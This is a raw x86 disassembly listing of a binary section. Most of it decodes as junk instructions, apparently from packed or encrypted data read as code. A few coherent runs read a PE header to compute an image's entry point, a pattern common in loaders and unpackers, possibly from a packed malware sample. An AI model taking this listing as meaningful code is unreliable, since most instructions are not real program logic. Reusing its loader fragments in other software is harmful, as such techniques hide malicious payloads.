  41d74d:	sti    
  41d74e:	js     0x41d7cb
  41d750:	mov    edi,0x2542c134
  41d755:	cmp    DWORD PTR [ebp+0x26],edi
  41d758:	and    eax,DWORD PTR [eax]
  41d75a:	xchg   esp,ebx
  41d75c:	mov    bh,0x9b
  41d75e:	jmp    0x41d703
  41d760:	push   ds
  41d761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d762:	dec    esp
  41d763:	mov    ebp,0x3fa5bfdc
  41d768:	retf   
  41d769:	jne    0x41d750
  41d76b:	xchg   ecx,eax
  41d76c:	hlt    
  41d76d:	mov    al,ds:0xb579bd88
  41d772:	push   ss
  41d773:	cmp    DWORD PTR [eax+esi*2+0x5d2fcdf4],ecx
  41d77a:	mov    esp,0x3639f0f8
  41d77f:	(bad)  
  41d780:	xchg   ebp,eax
  41d781:	push   ebx
  41d782:	mov    ecx,edi
  41d784:	adc    eax,0xa6e87ce7
  41d789:	or     eax,0xfdeaf911
  41d78e:	and    eax,0xfb6f5899
  41d793:	add    eax,0xa25b1860
  41d798:	xor    BYTE PTR [edi-0x51],ch
  41d79b:	lds    ecx,FWORD PTR [ecx]
  41d79d:	sti    
  41d79e:	cld    
  41d79f:	push   ss
  41d7a0:	and    eax,0xc74f45ae
  41d7a5:	aas    
  41d7a6:	sub    cl,BYTE PTR [esi-0x65577b17]
  41d7ac:	scas   al,BYTE PTR es:[edi]
  41d7ad:	loope  0x41d80f
  41d7af:	xchg   ebp,eax
  41d7b0:	push   0xba75e9f0
  41d7b5:	fisub  DWORD PTR [edi+0x1b]
  41d7b8:	jp     0x41d74a
  41d7ba:	jmp    0xa927434f
  41d7bf:	add    dl,BYTE PTR [esp+eax*8]
  41d7c2:	inc    edi
  41d7c3:	mov    ecx,0x716a2bd2
  41d7c8:	cmp    eax,0xa2ca472c
  41d7cd:	pop    esi
  41d7ce:	inc    esp
  41d7cf:	adc    BYTE PTR [esi+edi*2+0x3facea6],dl
  41d7d6:	ja     0x41d7a0
  41d7d8:	mov    bh,0x22
  41d7da:	pushf  
  41d7db:	dec    esi
  41d7dc:	inc    ebp
  41d7dd:	retf   
  41d7de:	enter  0x2335,0xa4
  41d7e2:	add    eax,0x30e157f
  41d7e7:	xchg   edx,ecx
  41d7e9:	retf   0xdc9d
  41d7ec:	shr    DWORD PTR [esi-0x18988513],cl
  41d7f2:	(bad)  
  41d7f3:	aad    0xf0
  41d7f5:	retf   0xbe60
  41d7f8:	jg     0x41d80d
  41d7fa:	pop    ds
  41d7fb:	sub    DWORD PTR [edi-0x28a0c1c2],ecx
  41d801:	lods   al,BYTE PTR ds:[esi]
  41d802:	test   bl,bh
  41d804:	and    ah,BYTE PTR [edx]
  41d806:	mov    ah,0xcc
  41d808:	pop    ebp
  41d809:	mov    ds:0xf7a86a6a,al
  41d80e:	dec    edx
  41d80f:	lea    edi,[esi]
  41d811:	enter  0x2c1e,0xee
  41d815:	out    dx,eax
  41d816:	mov    esi,0x69ff503f
  41d81b:	bound  ecx,QWORD PTR [edi+ecx*4-0x3b1ce1e0]
  41d822:	sbb    dh,0x19
  41d825:	mov    esp,0xce8cbf87
  41d82a:	repnz sbb dh,ah
  41d82d:	push   ebp
  41d82e:	dec    ebx
  41d82f:	dec    ebx
  41d830:	or     eax,0xf7c9af73
  41d835:	das    
  41d836:	lods   al,BYTE PTR ds:[esi]
  41d837:	test   al,0x37
  41d839:	test   bh,ch
  41d83b:	mov    BYTE PTR [edx+0x29b4f2a0],al
  41d841:	jnp    0x41d883
  41d843:	cwde   
  41d844:	inc    edx
  41d845:	icebp  
  41d846:	jbe    0x41d8c4
  41d848:	(bad)  
  41d849:	aad    0xca
  41d84b:	pop    es
  41d84c:	xchg   edx,eax
  41d84d:	aam    0x7f
  41d84f:	xchg   edx,eax
  41d850:	xchg   BYTE PTR [esi+eax*8+0x6e5b0049],bl
  41d857:	xlat   BYTE PTR ds:[ebx]
  41d858:	lahf   
  41d859:	or     DWORD PTR [esi],eax
  41d85b:	mov    ah,0x8d
  41d85d:	and    DWORD PTR ss:[edx+0xbd0590b],0xfe1dd33f
  41d868:	adc    al,0xaf
  41d86a:	add    DWORD PTR [eax+0x37347077],0x66
  41d871:	repnz mov ebp,0x38ee5d25
  41d877:	lahf   
  41d878:	je     0x41d857
  41d87a:	xchg   esi,eax
  41d87b:	arpl   si,si
  41d87d:	dec    esi
  41d87e:	push   edx
  41d87f:	sbb    ebp,DWORD PTR [ebx+0x2052209e]
  41d885:	mov    ch,0x27
  41d887:	aas    
  41d888:	retf   0x9731
  41d88b:	gs jns 0x41d8e5
  41d88e:	adc    ch,BYTE PTR [edi]
  41d890:	pop    ebp
  41d891:	xchg   ebp,eax
  41d892:	fucomp st(2)
  41d894:	xchg   ebp,eax
  41d895:	rol    DWORD PTR [eax-0xe99005],0x6
  41d89c:	jg     0x41d830
  41d89e:	mov    bh,BYTE PTR [esi+ebp*4-0x30]
  41d8a2:	mov    esi,0x2480caa1
  41d8a7:	imul   eax,DWORD PTR [edx-0x5d6a3f49],0x7d
  41d8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8af:	jecxz  0x41d8e1
  41d8b1:	lahf   
  41d8b2:	pushf  
  41d8b3:	xchg   DWORD PTR [edx-0x13],ecx
  41d8b6:	jmp    0xfc6c:0x7c8fc01c
  41d8bd:	push   0xffffffb8
  41d8bf:	scas   eax,DWORD PTR es:[edi]
  41d8c0:	imul   ebx,edi,0x5426e84b
  41d8c6:	retf   
  41d8c7:	clc    
  41d8c8:	sub    DWORD PTR gs:[eax+edi*2],0xe77d0d16
  41d8d0:	dec    eax
  41d8d1:	sbb    bh,BYTE PTR [edi]
  41d8d3:	arpl   WORD PTR [ebx-0x77d09ab3],bp
  41d8d9:	fild   QWORD PTR [esi-0x1d]
  41d8dc:	out    0x49,al
  41d8de:	neg    BYTE PTR [ebp-0x1d]
  41d8e1:	test   BYTE PTR [ebp+0x3],dl
  41d8e4:	std    
  41d8e5:	rcr    DWORD PTR [ebx+edi*2+0x6f],0xe4
  41d8ea:	inc    ebx
  41d8eb:	jbe    0x41d8fa
  41d8ed:	popf   
  41d8ee:	sbb    BYTE PTR [eax-0x5a],cl
  41d8f1:	fwait
  41d8f2:	pop    ss
  41d8f3:	inc    BYTE PTR [eax]
  41d8f5:	data16 add BYTE PTR [eax],0xed
  41d8f9:	mov    bl,bh
  41d8fb:	and    ah,ch
  41d8fd:	int    0x5d
  41d8ff:	push   ebp
  41d900:	mov    eax,eax
  41d902:	mov    esp,0x539e5ca4
  41d907:	inc    ebp
  41d908:	mov    edx,DWORD PTR [esp+0x18]
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422548
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0xfe7f73bc,eax
  41d941:	mov    esi,0x18164d7f
  41d946:	mov    esp,0x58181812
  41d94b:	ret    0xf8b3
  41d94e:	push   cs
  41d94f:	jbe    0x41d91f
  41d951:	fst    QWORD PTR [eax-0x61ac91a2]
  41d957:	jns    0x41d91b
  41d959:	in     al,0x39
  41d95b:	ins    BYTE PTR es:[edi],dx
  41d95c:	inc    edi
  41d95d:	sahf   
  41d95e:	imul   ebx,DWORD PTR [edx-0x1f5d7947],0x574098ae
  41d968:	fsub   QWORD PTR [ecx+0x17]
  41d96b:	mov    ds:0x690dac96,al
  41d970:	inc    ecx
  41d971:	out    dx,al
  41d972:	jge    0x41d8f7
  41d974:	pushf  
  41d975:	sub    DWORD PTR [edi],ebx
  41d977:	scas   al,BYTE PTR es:[edi]
  41d978:	les    edx,FWORD PTR [ecx-0x795b25c]
  41d97e:	xor    DWORD PTR [esi+0x1df0ff5c],esp
  41d984:	push   cs
  41d985:	fwait
  41d986:	push   edx
  41d987:	jmp    0x41d95d
  41d989:	or     al,0x8b
  41d98b:	pop    ebx
  41d98c:	sbb    dl,dh
  41d98e:	call   0xd34e:0x7ffc31d6
  41d995:	dec    ebp
  41d996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d997:	xor    ecx,DWORD PTR [edx]
  41d999:	outs   dx,DWORD PTR ds:[esi]
  41d99a:	sti    
  41d99b:	adc    eax,0x1b2ba01
  41d9a0:	sbb    esp,DWORD PTR [eax-0x6c5f4e97]
  41d9a6:	pop    ss
  41d9a7:	cdq    
  41d9a8:	ret    0x692f
  41d9ab:	fimul  WORD PTR [esi+0xa]
  41d9ae:	push   ebp
  41d9af:	dec    ebx
  41d9b0:	aad    0xb1
  41d9b2:	icebp  
  41d9b3:	mov    ah,0x9a
  41d9b5:	clc    
  41d9b6:	retf   0x314c
  41d9b9:	xlat   BYTE PTR ds:[ebx]
  41d9ba:	pushf  
  41d9bb:	mov    bh,0x45
  41d9bd:	(bad)  
  41d9be:	hlt    
  41d9bf:	into   
  41d9c0:	sti    
  41d9c1:	ins    BYTE PTR es:[edi],dx
  41d9c2:	mov    bl,BYTE PTR [ebx+0x59ba8f6]
  41d9c8:	test   al,0x82
  41d9ca:	add    ebx,DWORD PTR [edx-0x1ae51de2]
  41d9d0:	ins    BYTE PTR es:[edi],dx
  41d9d1:	pop    ecx
  41d9d2:	xor    BYTE PTR [edi-0x2f],ch
  41d9d5:	pusha  
  41d9d6:	fyl2x  
  41d9d8:	mov    bh,0xb
  41d9da:	pop    ss
  41d9db:	addr16 cmc 
  41d9dd:	or     cl,al
  41d9df:	enter  0xb70e,0x6f
  41d9e3:	outs   dx,BYTE PTR ds:[esi]
  41d9e4:	and    al,0x29
  41d9e6:	jno    0x41da27
  41d9e8:	repz pop esi
  41d9ea:	out    dx,eax
  41d9eb:	fadd   DWORD PTR [ebp-0x38]
  41d9ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9ef:	inc    edx
  41d9f0:	ja     0x41d97f
  41d9f2:	(bad)  
  41d9f3:	js     0x41da4c
  41d9f5:	and    edx,edx
  41d9f7:	mov    al,0xbc
  41d9f9:	pop    esi
  41d9fa:	mov    al,ah
  41d9fc:	inc    edi
  41d9fd:	mov    ch,0xef
  41d9ff:	sub    al,0xdd
  41da01:	data16 (bad) 
  41da03:	aaa    
  41da04:	(bad)  
  41da05:	int3   
  41da06:	repz jmp 0x46053b2
  41da0c:	imul   edi,eax,0xffffffb2
  41da0f:	sub    BYTE PTR [edx+edx*1],ch
  41da12:	ds mov ebx,0x79197c53
  41da18:	mov    dh,bh
  41da1a:	aaa    
  41da1b:	ins    BYTE PTR es:[edi],dx
  41da1c:	(bad)  
  41da1e:	bound  edx,QWORD PTR [edx+0x66]
  41da21:	icebp  
  41da22:	test   BYTE PTR [esi-0x45],bl
  41da25:	sbb    cl,0x69
  41da28:	pop    es
  41da29:	sub    eax,0xc99b975f
  41da2e:	adc    al,0x81
  41da30:	pop    esp
  41da31:	je     0x41da6e
  41da33:	mov    ds:0x32da6db5,al
  41da38:	jmp    0xc270:0x8514351
  41da3f:	pop    edi
  41da40:	sti    
  41da41:	scas   eax,DWORD PTR es:[edi]
  41da42:	xchg   esi,eax
  41da43:	test   BYTE PTR [edi+0x2],0xd2
  41da47:	mov    ecx,0xbddf8c88
  41da4c:	jne    0x41d9d6
  41da4e:	inc    esp
  41da4f:	mul    BYTE PTR [edi+0x6ee4626d]
  41da55:	sbb    BYTE PTR [esi],cl
  41da57:	push   edx
  41da58:	fsubrp st(0),st
  41da5a:	mov    esp,DWORD PTR [ebx+0x2e92ebe1]
  41da60:	iret   
  41da61:	mov    DWORD PTR [ebp-0x4a694c4],edx
  41da67:	or     bh,ah
  41da69:	dec    esi
  41da6a:	cdq    
  41da6b:	sbb    esi,DWORD PTR [eax-0x7]
  41da6e:	cmp    DWORD PTR [eax+esi*8],esi
  41da71:	dec    ecx
  41da72:	popf   
  41da73:	push   eax
  41da74:	mov    ds:0xf93b9800,al
  41da79:	xchg   edi,eax
  41da7a:	out    0x87,eax
  41da7c:	adc    eax,DWORD PTR [eax]
  41da7e:	mov    ch,0x78
  41da80:	(bad)  
  41da81:	pop    edx
  41da82:	add    BYTE PTR [edx+0x34],ch
  41da85:	popf   
  41da86:	out    dx,eax
  41da87:	lock sbb cl,BYTE PTR [ebx+0x735d1cad]
  41da8e:	mov    esp,0xc5d576f7
  41da93:	mov    bh,BYTE PTR [esi]
  41da95:	imul   esi,DWORD PTR [ebp+0x659471fa],0xb3f7d790
  41da9f:	fdivr  st(7),st
  41daa1:	in     al,0xb5
  41daa3:	push   ebp
  41daa4:	popa   
  41daa5:	inc    ebp
  41daa6:	mov    fs,WORD PTR [esi]
  41daa8:	jbe    0x41daeb
  41daaa:	les    ecx,FWORD PTR [ecx]
  41daac:	xor    eax,0xea66ee9c
  41dab1:	into   
  41dab2:	sub    al,0x7a
  41dab4:	pop    ebp
  41dab5:	sub    al,0xac
  41dab7:	jl     0x41dabe
  41dab9:	aas    
  41daba:	add    DWORD PTR [edx],ebx
  41dabc:	push   ecx
  41dabd:	jmp    0x8835:0x803526af
  41dac4:	lahf   
  41dac5:	data16 sbb cl,cl
  41dac8:	ret    
  41dac9:	in     al,0x1e
  41dacb:	dec    edi
  41dacc:	xchg   ebp,eax
  41dacd:	or     ch,BYTE PTR [esi-0x4f]
  41dad0:	or     ah,BYTE PTR [esi-0x4b]
  41dad3:	inc    eax
  41dad4:	sbb    bh,BYTE PTR [esi]
  41dad6:	dec    ecx
  41dad7:	in     al,dx
  41dad8:	sbb    ebx,esp
  41dada:	mov    edi,0xad615374
  41dadf:	fdiv   QWORD PTR [esi+0x2c]
  41dae2:	es jno 0x5c8af3e1
  41dae9:	mov    eax,ds:0xebea932d
  41daee:	ds jge 0x41dadd
  41daf1:	dec    edx
  41daf2:	push   DWORD PTR [ebx]
  41daf4:	call   0xf91975d8
  41daf9:	lahf   
  41dafa:	jns    0x41db4b
  41dafc:	into   
  41dafd:	sub    BYTE PTR [esi],ch
  41daff:	lods   eax,DWORD PTR ds:[esi]
  41db00:	(bad)  
  41db01:	shl    al,0xff
  41db04:	repnz sub al,0x3a
  41db07:	mov    ch,0x9b
  41db09:	ins    BYTE PTR es:[edi],dx
  41db0a:	and    dh,BYTE PTR [esi]
  41db0c:	sub    dl,BYTE PTR [edx+0x42cd7114]
  41db12:	cmc    
  41db13:	cmp    dh,BYTE PTR [eax+0x4d]
  41db16:	or     al,0x70
  41db18:	inc    esp
  41db19:	inc    eax
  41db1a:	mov    esi,0x93749d3f
  41db1f:	rep lods al,BYTE PTR ds:[esi]
  41db21:	int    0xbf
  41db23:	cwde   
  41db24:	(bad)
  41db27:	mov    al,ds:0x1eb058cd
  41db2c:	jbe    0x41db3c
  41db2e:	pop    es
  41db2f:	pop    ss
  41db30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db31:	int    0x8c
  41db33:	and    esp,DWORD PTR [eax]
  41db35:	imul   eax,DWORD PTR [esi],0xad830f35
  41db3b:	shr    BYTE PTR [eax+0x25],0xae
  41db3f:	push   ds
  41db40:	dec    edi
  41db41:	rcr    DWORD PTR [edi-0x256f9162],0x54
  41db48:	lea    edi,[ecx]
  41db4a:	bound  ebp,QWORD PTR [edi]
  41db4c:	mov    esi,0x1882ace4
  41db51:	push   0xffffffc7
  41db53:	push   ebp
  41db54:	adc    ecx,DWORD PTR [ebx+0x28a0fc64]
  41db5a:	(bad)  
  41db5b:	mov    dl,0xf0
  41db5d:	ins    DWORD PTR es:[edi],dx
  41db5e:	jno    0x41db91
  41db60:	and    BYTE PTR [edx-0x64],0x40
  41db64:	in     eax,dx
  41db65:	push   cs
  41db66:	push   ebx
  41db67:	call   0xb62488c7
  41db6c:	xchg   ecx,eax
  41db6d:	or     eax,0xfcad4683
  41db72:	stos   DWORD PTR es:[edi],eax
  41db73:	xchg   ebx,eax
  41db74:	xchg   edx,eax
  41db76:	rol    esi,0xf7
  41db79:	pop    edi
  41db7a:	js     0x41daff
  41db7c:	adc    eax,DWORD PTR [eax]
  41db7e:	cmp    edx,DWORD PTR [esi]
  41db80:	and    BYTE PTR [edx],bh
  41db82:	jno    0x41db10
  41db84:	ret    0x8447
  41db87:	test   BYTE PTR [edi-0x5c88588a],bh
  41db8d:	repz dec ecx
  41db8f:	pop    ecx
  41db90:	xor    DWORD PTR [ecx],ebx
  41db92:	scas   al,BYTE PTR es:[edi]
  41db93:	mov    ah,0xcb
  41db95:	push   esi
  41db96:	stos   BYTE PTR es:[edi],al
  41db97:	retf   
  41db98:	loopne 0x41db2b
  41db9a:	icebp  
  41db9b:	and    cl,dl
  41db9d:	pop    ss
  41db9e:	sbb    BYTE PTR [edi],ah
  41dba0:	nop
  41dba1:	loop   0x41db3b
  41dba3:	push   edi
  41dba4:	out    dx,eax
  41dba5:	int3   
  41dba6:	jmp    0x41db2d
  41dba8:	jmp    FWORD PTR [ebx+0x269a3883]
  41dbae:	jecxz  0x41dbe0
  41dbb0:	arpl   di,bx
  41dbb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbb3:	lock sbb DWORD PTR [eax],edi
  41dbb6:	call   0x9ff4:0x27f4b40e
  41dbbd:	mov    eax,ds:0x8bfc381d
  41dbc2:	mov    edi,0x3a5c25c9
  41dbc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbc8:	pushf  
  41dbc9:	xor    BYTE PTR [ebx+0x4ebba34a],ch
  41dbcf:	pop    eax
  41dbd0:	arpl   WORD PTR [ecx],bp
  41dbd2:	lahf   
  41dbd3:	retf   0x6b25
  41dbd6:	hlt    
  41dbd7:	not    BYTE PTR [esi+0x16421735]
  41dbdd:	xchg   edx,eax
  41dbde:	pop    ecx
  41dbdf:	cli    
  41dbe0:	jecxz  0x41db67
  41dbe2:	in     eax,0x67
  41dbe4:	and    eax,0xf83fdaa9
  41dbe9:	(bad)  
  41dbea:	in     eax,0x85
  41dbec:	cld    
  41dbed:	jmp    0x41db95
  41dbef:	pushf  
  41dbf0:	add    ch,BYTE PTR [eax]
  41dbf2:	ins    BYTE PTR es:[edi],dx
  41dbf3:	push   ebx
  41dbf4:	pushf  
  41dbf5:	push   cs
  41dbf6:	sbb    al,0xe5
  41dbf8:	cmc    
  41dbf9:	cmp    esi,DWORD PTR [ebp-0x22bf0e1f]
  41dbff:	rcr    eax,1
  41dc01:	mov    edx,0xa768117c
  41dc06:	lea    ebp,[edx+eax*1-0x21]
  41dc0a:	push   ss
  41dc0b:	lods   al,BYTE PTR ds:[esi]
  41dc0c:	mov    ebx,0x2499f5a9
  41dc11:	retf   
  41dc12:	inc    ebx
  41dc13:	adc    eax,esi
  41dc15:	(bad)  
  41dc17:	sbb    dl,BYTE PTR [esp+ebp*2-0x9]
  41dc1b:	mov    esp,0xda62c1e5
  41dc20:	sti    
  41dc21:	xchg   edx,eax
  41dc22:	ins    BYTE PTR es:[edi],dx
  41dc23:	ficom  DWORD PTR [eax-0x32ba1a5]
  41dc29:	dec    ecx
  41dc2a:	icebp  
  41dc2b:	stos   BYTE PTR es:[edi],al
  41dc2c:	int3   
  41dc2d:	mov    al,ah
  41dc2f:	pop    edi
  41dc30:	scas   al,BYTE PTR es:[edi]
  41dc31:	cs icebp 
  41dc33:	ins    DWORD PTR es:[edi],dx
  41dc34:	sbb    ebx,DWORD PTR [esi]
  41dc36:	test   eax,0x872ad4c5
  41dc3b:	dec    edx
  41dc3c:	ja     0x41dc28
  41dc3e:	add    BYTE PTR [eax-0x257993a7],0xd3
  41dc45:	xchg   esi,eax
  41dc46:	clc    
  41dc47:	xchg   ebx,eax
  41dc48:	jmp    0xa92b:0x2f6b2785
  41dc4f:	sub    eax,0xf1fedb6d
  41dc54:	fucomi st,st(7)
  41dc56:	ins    BYTE PTR es:[edi],dx
  41dc57:	pop    ebx
  41dc58:	stos   DWORD PTR es:[edi],eax
  41dc59:	dec    edi
  41dc5a:	int3   
  41dc5b:	push   ds
  41dc5c:	and    eax,DWORD PTR [ebp+0x4b6d3f09]
  41dc62:	imul   esi,DWORD PTR [edi+0x7026e81b],0xdf53b495
  41dc6c:	and    al,0x87
  41dc6e:	gs cdq 
  41dc70:	adc    BYTE PTR ds:[edi],cl
  41dc73:	pop    eax
  41dc74:	mov    ah,0xcd
  41dc76:	loop   0x41dcea
  41dc78:	or     DWORD PTR [edi],eax
  41dc7a:	fs xchg edx,eax
  41dc7c:	mov    BYTE PTR [eax-0x4e],bh
  41dc7f:	dec    esp
  41dc80:	sti    
  41dc81:	mov    eax,ebp
  41dc83:	not    DWORD PTR [ecx-0x4694525e]
  41dc89:	or     eax,0xcf12b941
  41dc8e:	inc    ebx
  41dc8f:	add    eax,0xb4b450c1
  41dc94:	jbe    0x41dc5b
  41dc96:	inc    ebx
  41dc97:	dec    esp
  41dc98:	clc    
  41dc99:	cmp    DWORD PTR [edi],edx
  41dc9b:	(bad)  
  41dc9c:	arpl   WORD PTR [eax-0x6a9bf940],si
  41dca2:	dec    edx
  41dca3:	cwde   
  41dca4:	sbb    eax,0x3e4c4675
  41dca9:	mov    edx,0x5087539a
  41dcae:	adc    eax,0x85c421fb
  41dcb3:	aad    0x3d
  41dcb5:	push   eax
  41dcb6:	xacquire xchg BYTE PTR [ecx-0x5bee4c73],bl
  41dcbd:	cld    
  41dcbe:	lds    edi,FWORD PTR [eax+0x10f625e5]
  41dcc4:	jne    0x41dd1f
  41dcc6:	out    0x13,eax
  41dcc8:	sahf   
  41dcc9:	pop    ebx
  41dcca:	rol    dh,1
  41dccc:	push   es
  41dccd:	or     dl,BYTE PTR [ecx+eax*2+0x5a]
  41dcd1:	lock aaa 
  41dcd3:	mov    al,0xe7
  41dcd5:	std    
  41dcd6:	cmp    bh,0xcf
  41dcd9:	ja     0x41dcc5
  41dcdb:	div    DWORD PTR [eax]
  41dcdd:	sub    eax,0xa56a3f2
  41dce2:	mov    dl,0xf6
  41dce4:	adc    cl,bl
  41dce6:	popa   
  41dce7:	fstp   QWORD PTR [eax+0x30]
  41dcea:	push   es
  41dceb:	mov    ah,0xea
  41dced:	loope  0x41dd3d
  41dcef:	aaa    
  41dcf0:	jno    0x41dd3c
  41dcf2:	and    eax,0x65ce4797
  41dcf7:	dec    ebx
  41dcf8:	mov    cl,ah
  41dcfa:	inc    edx
  41dcfb:	mov    ebp,0x6c24448d
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0x67
  41dd5b:	jge    0x41dd7c
  41dd5d:	jle    0x41dd81
  41dd5f:	inc    edi
  41dd60:	push   ss
  41dd61:	sbb    BYTE PTR [edx+edx*1-0x3579e7e8],bh
  41dd68:	xor    dh,bh
  41dd6a:	inc    edi
  41dd6b:	add    eax,0x26f3ffe1
  41dd70:	mov    dh,0x5
  41dd72:	dec    eax
  41dd73:	sbb    dh,BYTE PTR [edi-0x5bee4d22]
  41dd79:	jmp    0x1b16beed
  41dd7e:	add    BYTE PTR [ecx+0x6a66b121],0x51
  41dd85:	xor    esi,DWORD PTR [eax]
  41dd87:	loopne 0x41dd9b
  41dd89:	int    0x96
  41dd8b:	pusha  
  41dd8c:	xchg   ecx,eax
  41dd8d:	cld    
  41dd8e:	sub    al,0x9e
  41dd90:	mov    bh,0x4b
  41dd92:	lock sti 
  41dd94:	dec    ebp
  41dd95:	(bad)  
  41dd96:	cli    
  41dd97:	ret    
  41dd98:	clc    
  41dd99:	xor    DWORD PTR [edx-0x4c0220d8],esi
  41dd9f:	test   ebx,esp
  41dda1:	jge    0x41dd88
  41dda3:	xor    al,cl
  41dda5:	dec    esp
  41dda6:	inc    eax
  41dda7:	in     al,0x4c
  41dda9:	jmp    0x41dd3c
  41ddab:	mov    al,ds:0x7611e33
  41ddb0:	dec    eax
  41ddb1:	cmp    DWORD PTR [esi-0x12b7873c],eax
  41ddb7:	mov    esi,0x710aecaa
  41ddbc:	mov    edi,0x75185c0c
  41ddc1:	enter  0xb848,0x97
  41ddc5:	scas   al,BYTE PTR es:[edi]
  41ddc6:	xchg   ecx,eax
  41ddc7:	inc    eax
  41ddc8:	bound  ebp,QWORD PTR ds:0xc9adf7db
  41ddce:	lahf   
  41ddcf:	jo     0x41dde4
  41ddd1:	dec    edi
  41ddd2:	mov    esp,0x50a5375e
  41ddd7:	es mov ch,0x97
  41ddda:	stc    
  41dddb:	xchg   ebx,eax
  41dddc:	and    eax,0xbe187c16
  41dde1:	test   eax,0xb81c6a09
  41dde6:	cmp    BYTE PTR [ebx-0x393363c],dh
  41ddec:	retf   
  41dded:	mov    edi,0xf25cfa97
  41ddf2:	icebp  
  41ddf3:	cmp    DWORD PTR [ebx+edi*2+0x41],esp
  41ddf7:	xor    ch,cl
  41ddf9:	adc    ch,dl
  41ddfb:	xor    al,0x6e
  41ddfd:	stc    
  41ddfe:	mov    ss:0x5c856602,eax
  41de04:	or     BYTE PTR [ebp-0x5d2612f0],bh
  41de0a:	jmp    0x7eb0252d
  41de0f:	sub    DWORD PTR [edx-0x304d9960],0xffffffd0
  41de16:	inc    edi
  41de17:	cmp    al,bh
  41de19:	xlat   BYTE PTR ds:[ebx]
  41de1a:	loopne 0x41ddbe
  41de1c:	fmul   st,st(4)
  41de1e:	dec    edx
  41de1f:	mov    ch,0x3d
  41de21:	mov    edx,0x82fe9cc
  41de26:	cmp    ebx,DWORD PTR [edi+0x8979b]
  41de2c:	inc    edi
  41de2d:	sub    BYTE PTR [esi+0x5c],bl
  41de30:	add    dh,ch
  41de32:	ins    DWORD PTR es:[edi],dx
  41de33:	xchg   ebp,eax
  41de34:	faddp  st(0),st
  41de36:	enter  0x6b19,0x8f
  41de3a:	(bad)  
  41de3b:	pop    edi
  41de3c:	inc    ebp
  41de3d:	cli    
  41de3e:	push   eax
  41de3f:	jl     0x41ddfb
  41de41:	jns    0x41de8f
  41de43:	in     al,dx
  41de44:	shl    DWORD PTR [esi],1
  41de46:	pop    edx
  41de47:	repz xlat BYTE PTR ds:[ebx]
  41de49:	xor    dh,BYTE PTR [edx+edi*2-0x486cc586]
  41de50:	cmp    eax,0xac2cf68f
  41de55:	mov    bl,0xe
  41de57:	int3   
  41de58:	aam    0xd4
  41de5a:	jmp    0x41de5b
  41de5c:	xchg   ecx,eax
  41de5d:	iret   
  41de5e:	ins    DWORD PTR es:[edi],dx
  41de5f:	sbb    dl,dh
  41de61:	repnz add ah,dh
  41de64:	dec    esi
  41de65:	pop    eax
  41de66:	sbb    BYTE PTR [ecx],bh
  41de68:	dec    edi
  41de69:	push   esp
  41de6a:	add    eax,0xe14deebd
  41de6f:	cmp    BYTE PTR [eax],bh
  41de71:	jge    0x41de68
  41de73:	clc    
  41de74:	pxor   mm7,mm6
  41de77:	sub    ebp,esp
  41de79:	inc    ebp
  41de7a:	loopne 0x41de73
  41de7c:	xchg   edi,eax
  41de7d:	mov    ebp,DWORD PTR [eax+edi*2-0x2d]
  41de81:	pop    ds
  41de82:	imul   ebp,DWORD PTR [ebx-0x63d97cd2],0xfe113f0d
  41de8c:	fstp   TBYTE PTR [eax]
  41de8e:	add    al,0x95
  41de90:	mov    eax,ds:0x9d216776
  41de95:	add    al,0xfb
  41de97:	or     ch,cl
  41de99:	sti    
  41de9a:	push   ebx
  41de9b:	aam    0x9
  41de9d:	mov    al,ds:0x4840878f
  41dea2:	xchg   BYTE PTR [ecx+0x200977ee],dh
  41dea8:	mov    ecx,0x88c93600
  41dead:	push   0xffffff92
  41deaf:	dec    edi
  41deb0:	sbb    dl,al
  41deb2:	pop    ebp
  41deb3:	jmp    0xa1b3023c
  41deb8:	xchg   BYTE PTR [ebp+0x234c5e64],bh
  41debe:	(bad)
  41dec2:	mov    bh,al
  41dec4:	sub    dh,ch
  41dec6:	jg     0x41df2c
  41dec8:	lods   eax,DWORD PTR ds:[esi]
  41dec9:	daa    
  41deca:	nop
  41decb:	das    
  41decc:	popa   
  41decd:	or     DWORD PTR [ecx+ebp*8+0x5bcff285],ecx
  41ded4:	sub    BYTE PTR [edi+ecx*8],dl
  41ded7:	adc    ch,bh
  41ded9:	fucom  st(0)
  41dedb:	in     eax,0x25
  41dedd:	adc    al,0x16
  41dedf:	xsha256 (bad)
  41dee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dee1:	push   ebx
  41dee2:	xchg   esp,eax
  41dee3:	dec    edx
  41dee4:	cmp    ebx,ebp
